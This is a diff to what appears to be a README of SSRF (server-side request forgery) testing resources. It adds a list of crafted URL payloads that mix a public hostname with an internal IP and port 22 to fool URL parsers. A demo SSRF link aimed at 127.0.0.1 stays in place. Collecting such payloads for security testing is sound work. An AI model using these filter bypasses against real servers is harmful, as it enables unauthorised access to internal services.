@@ -1,4 +1,13 @@
-# SSRF(Server Side Request Forgery) testing resources
+# SSRF (Server Side Request Forgery) testing resources
+
+***
+
+### Quick URL based bypasses:
+`http://google.com:80+&@127.88.23.245:22/#+@google.com:80/`
+`http://127.88.23.245:22/+&@google.com:80#+@google.com:80/`
+`http://google.com:80+&@google.com:80#+@127.88.23.245:22/`
+`http://127.88.23.245:22/?@google.com:80/`
+`http://127.88.23.245:22/#@www.google.com:80/`
 
 ***
 
@@ -145,6 +154,10 @@ https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFn
 #### Live demo:
 
 `http://ssrf.localdomain.pw/iframe/?proto=http&ip=127.0.0.1&port=80&url=/`
+
+***
+
+### commonly-open-ports.txt - list of commonly open ports
 
 ***
 
